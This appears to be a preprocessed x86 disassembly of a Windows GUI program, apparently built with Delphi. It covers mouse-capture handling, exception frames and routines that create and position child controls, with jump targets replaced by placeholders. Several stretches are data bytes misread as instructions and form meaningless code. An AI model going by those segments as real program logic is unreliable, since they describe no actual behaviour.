lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_44b0fc
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_425738
push eax
call sub_44ae1c
lea ecx [ ebp - 0x28 ]
pop edx
call sub_44b008
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425738
push eax
call sub_44ae1c
lea ecx [ ebp - 0x28 ]
pop edx
call sub_44af6c
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_424f74
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_425318
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_417744
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_455a4c
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_457d2c
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4382e0
mov edx 0xff000014
mov eax 0xff00000f
call sub_42c058
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424f48
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_425318
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438959
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fa0
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_417744
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4247a8
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_455a4c
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_457d2c
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4382e0
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_438960
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_4542f8
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_456c00
jmp r-xdata
sub_4389c4
push ebx
mov ebx eax
mov eax ebx
call sub_457b08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_437798
pop ebx
retn
sub_4389f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_457014
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438a48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_4572cc
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_438960
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_455450
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_455494
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_438ae8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_457374
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_455450
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_455494
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_438ca0
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_438960
mov eax ebx
mov si 0xffeb
call sub_4033e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_438c34
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_437770
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438c68
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_459098
sub_438ca0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_438c68
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_438d98
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438e08
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_437798
mov eax ebx
call sub_438960
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_438e3c
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_462174
sub_438eac
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_438f35
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455a4c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_46cbe8
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_4033e8
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438f3c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_438f78
push ebx
push esi
mov esi eax
mov eax esi
call sub_457778
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_438fec
push ebx
push esi
mov esi eax
mov eax esi
call sub_457790
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_439054
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_438c04
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_42a3dc
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_424f74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41776c
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_42a3dc
pop edx
call sub_425318
push 0x0
push edi
push 0x1
mov eax ebx
call sub_42a3dc
mov edx eax
xor ecx ecx
mov eax esi
call sub_463550
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4390e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_457920
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_438d2c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438c04
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_463038
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_439054
pop ecx
sub_43927c
enter 0x4392 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebx - 0x6cafffbd ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
xchg ebx eax
inc ebx
add [ esi ] dh
xchg ebx eax
inc ebx
add al dl
add [ eax ] al
add [ eax ] cl
pop es
inc ebx
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al ch
push ds
inc ebx
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ecx - 0x6b43ffbd ] dh
inc ecx
add ah dl
and eax [ ebx ]
fcom [ ebx + 0x173c0041 ]
inc edx
add [ eax ] cl
push ss
inc edx
add [ edi + edx + 0x42 ] cl
add [ eax + ebx + 0x42 ] al
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax - 0x6a ] bl
inc ebx
add [ edx ] dl
inc ebx
add al al
push ds
inc ebx
add [ eax - 0x4bffbce1 ] bh
pushfd
inc ebx
add [ ecx + ebp ] ch
inc ebx
add al ch
pushfd
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
int3
sub_43932a
mov esp 0xd400439b
cdq
inc ebx
add al dl
fwait
inc ebx
add [ edx ] dl
push esp
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
xchg esp eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
xchg esp eax
inc ebx
add al dl
add [ eax ] al
add [ edx + edx * 4 + 0x43 ] bh
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al ch
push ds
inc ebx
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ecx - 0x6b43ffbd ] dh
inc ecx
add ah dl
and eax [ ebx ]
fcom [ ebx + 0x173c0041 ]
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x408d676f
add [ eax - 0x6d ] dl
inc ebx
add [ edi ] al
adc dl [ edi + ecx * 2 + 0x70 ]
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x92c8676f
inc ebx
add al bh
pop es
inc ebx
add [ ebx ] dl
add [ edi ] al
inc ebp
js r-xdata
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x20 ] ah
inc ebp
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x4890676f
xchg esp eax
inc ebx
add [ edi ] al
adc dl [ ebx + edx * 2 + 0x61 ]
jbe r-xdata
inc edx
add [ eax ] cl
push ss
inc edx
add [ edi + edx + 0x42 ] cl
add [ eax + ebx + 0x42 ] al
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax - 0x6a ] bl
inc ebx
add [ edx ] dl
inc ebx
add al al
push ds
inc ebx
add [ eax - 0x5bffbce1 ] bh
lahf
inc ebx
add [ ecx + ebp ] ch
inc ebx
add al ch
pushfd
inc ebx
add [ edx ] dl
push esp
push ebx
popad
jbe r-xdata
inc ebx
add [ esp + edx * 4 + 0x23d40041 ] bh
inc ebx
add al bl
xchg ebx eax
inc ecx
add [ edi + edx ] bh
inc esp
insb
jae r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
mov al [ 0x60004031 ]
loopne r-xdata
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x93e8676f
inc ebx
add [ ebx + edx * 4 + 0x43 ] cl
add [ ebx ] dl
add [ edi ] al
inc ebp
js r-xdata
in al 0x10
inc eax
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
add ah ah
adc [ eax ] al
pushad
add [ eax ] al
jmp [ eax ]
rcl [ ebp + eax * 2 + 0x45930000 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x1f4fffbb ] dl
inc ebp
add [ esi + 0x43 ] dl
add al bl
mov edi 0xc3000045
inc ebp
add [ eax + 0x1004362 ] al
add [ edi ] cl
add al dl
xchg ebp eax
inc ebx
add [ ecx ] dl
push esp
push ebx
imul ebp [ ebp + 0x6e ] 0x69615074
outsb
je r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
add [ esi + ecx * 8 + 0x45 ] dl
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add ah dl
pop edi
inc ebx
add [ eax - 0x37 ] ch
inc ebp
add [ eax ] ch
inc bx
add al dl
int 0x45
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
inc edx
inc esp
insb
jae r-xdata
and [ ebx ] dh
rcl [ ebp + 0x68 ] 0xf
xchg esi eax
inc ebx
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45e090
popad
outsb
insb
mov eax eax
test al 0x95
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] edx
insb
outsb
je r-xdata
add [ esp + edx * 4 + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x95
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffbc6b ] cl
xchg ebp eax
inc ebx
add [ eax ] ch
add al [ eax ]
add al dh
dec ebp
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec edx
add al [ eax ]
popad
imul ebp [ esi + 0x74 ] 0x656e6150
insb
mov esp 0x10004394
dec edi
inc ebx
add [ edx ] al
pop es
inc ebp
js r-xdata
add [ ebp + 0x36e8f845 ] cl
test eax 0xe9c3fffc
xor al 0xa3
cld
inc esp
insb
jae r-xdata
add [ eax - 0x7c1374ab ] dl
sub_439658
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_43990d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_432138
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_42bc18
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_403fd0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_435fd4
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_455a7c
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_436424
mov edx 0x6
mov eax ebx
call sub_43645c
mov dx 0x1
mov eax ebx
call sub_45c59c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d3a0
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_455a7c
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_454f60
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_438430
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_438c04
mov ecx r-xdata
mov edx [ rw-data ]
call sub_42a7fc
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_405d64
xor edx edx
mov eax ebx
call sub_455bc0
mov dl 0x1
mov eax ebx
call sub_455b9c
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_435fd4
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_455a7c
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_454f60
mov dl 0x2
mov eax ebx
call sub_436408
mov dl 0x1
mov eax ebx
call sub_436424
xor edx edx
mov eax ebx
call sub_45c59c
mov ecx esi
mov dl 0x1
mov eax [ sub_4345dc ]
call sub_43582c
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_454f60
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_435c58
mov dl 0x1
mov eax ebx
call sub_435c28
mov dl 0x1
mov eax ebx
call sub_435c00
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439914
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
add esp 0xfffffff0
call sub_403550
sub_439914
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4399ac
or [ eax ] al
add [ eax ] al
push eax
popad
imul ebp [ esi + 0x74 ] 0x786f42
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5589173d ]
cld
call [ eax - 0x18 ]
inc eax
leave
cld
inc [ ebx - 0x6af00008 ]
rcr [ ebx - 0x3d ] 0x55
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439bac
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_432980
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xcc ]
call sub_404388
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_432338
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439bb3
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fa0
retn
mov eax [ ebp - 0x4 ]
add eax 0xcc
mov edx [ ebp - 0x8 ]
call sub_403fd0
mov eax [ ebp - 0x8 ]
call sub_4087a8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4399bc
test al al
jne r-xdata
test bl bl
je r-xdata
mov bl 0x1
test bl bl
jne r-xdata
xor eax eax
push ebp
push sub_439b10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
mov eax [ eax + 0x168 ]
mov edx [ ebp - 0x8 ]
call sub_42796c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427dd8
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427df0
